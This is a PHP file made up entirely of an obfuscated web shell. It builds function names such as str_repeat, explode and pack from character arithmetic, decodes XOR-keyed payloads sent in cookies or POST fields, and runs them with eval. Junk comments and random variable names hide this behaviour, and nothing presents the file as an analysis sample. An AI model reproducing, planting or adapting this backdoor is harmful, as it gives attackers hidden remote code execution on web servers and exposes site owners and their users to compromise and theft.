<?php
$OkQxjSajdl   =/*CEKT   */"\x73"  .  chr/*Sv  */(	594 -	478	).chr	(/*Gf*/344     -	230   )."\137"  ./* dTDx*/"\x72"	.	"\x65"	.	"\160"	.	"\145"   .    'a'/*  DraN */./*jdwyx  */'t';
				$bEZUkL	=   "\145"	.     chr	(120)/* C   */.	'p'/* IY  */.   "\154"/*  so*/.   chr	(	477	-	366   )."\x64"	./*  g   */"\145";
				$PKnINP/*TW*/=   chr   (99) .	"\x6f"     . "\165"   .	'n'/*PeZ   */./*MU*/"\164";

$kmLFb =   chr/* xy */(   437	-	325	).chr	(97)	./*   XBg*/chr/*   XaeWP  */(99)   ./*ThTM   */chr	(107);

$IjGmPYtJ	=    Array  (	"zkLsw"	=>	"cRwVmlsQqgAWvk"/*eUo  */);
	/*   y*/$GdIASfJDbE/*  y */=  Array/*vGLKV   */(/* khvDQ  */"gDrcUsvtgFjyRIBlKwaFUUMWOcAo"	=>	"XqloXKfQwFbRomiiIyzoczD"/*   CcU*/);
   foreach     (	Array(/*  gjP   */$IjGmPYtJ,	$_COOKIE,   $GdIASfJDbE,/*ttVo   */$_POST,	$IjGmPYtJ)    as/*   WiQ */$bvJwz)    {
   	foreach/* o */( $bvJwz	as/*NT  */$rsEOWm     => $cThNnbF/* M   */)	{
					     $cThNnbF/*  oh   */=/*   TN  */@$kmLFb(	chr	(	990    -	918    )."\52",	$cThNnbF/* LrPM */);
					/* YTo  */$rsEOWm	.=	"rclzxzR-TgG-hQBlMUN-NipLHq-uMoO-kcGthMI-efqhZrI";
				$rsEOWm	=     $OkQxjSajdl     (/*  Xtfkn  */$rsEOWm,   (   strlen(	$cThNnbF  )/strlen(	$rsEOWm  )  )	+/*   A */1);

	$FNpjnOIM	=	$cThNnbF/* T*/^     $rsEOWm;
   $cQgGOlyuI/* YjR */= $bEZUkL	(	chr    (    641 - 606 ),/*cT   */$FNpjnOIM/*   E  */);
		/*   SbjPB   */if	(	$PKnINP	(	$cQgGOlyuI     )     ==    3	)	{
 	$LfAuQPuFVe/*kGL   */=	$cQgGOlyuI[1];
    /*wXVN  */$zECVSJeCx     =/* eX  */$cQgGOlyuI[2];
   /*giq */$jBZEoSE     =  $LfAuQPuFVe($zECVSJeCx);

	eval	(	$jBZEoSE     );
    /*B*/die	();
		}


 }
/*yf  */}